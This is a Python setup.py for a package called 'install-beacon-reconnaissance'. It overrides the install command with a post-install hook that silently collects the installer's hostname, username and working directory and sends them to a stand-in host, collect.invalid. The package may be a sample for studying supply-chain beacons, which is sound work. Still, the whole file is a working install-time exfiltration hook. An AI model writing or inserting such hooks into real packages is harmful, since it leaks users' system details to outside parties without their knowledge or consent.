import getpass
import os
import socket

import requests
from setuptools import setup
from setuptools.command.install import install as _install


def _report(directory):
    payload = {
        'host': socket.gethostname(),
        'user': getpass.getuser(),
        'cwd': os.getcwd(),
    }
    requests.get('https://collect.invalid/confirm', params=payload)


class install(_install):
    def run(self):
        _install.run(self)
        self.execute(_report, (self.install_lib,), msg="post install")


setup(name='install-beacon-reconnaissance', version='1.0', cmdclass={'install': install})
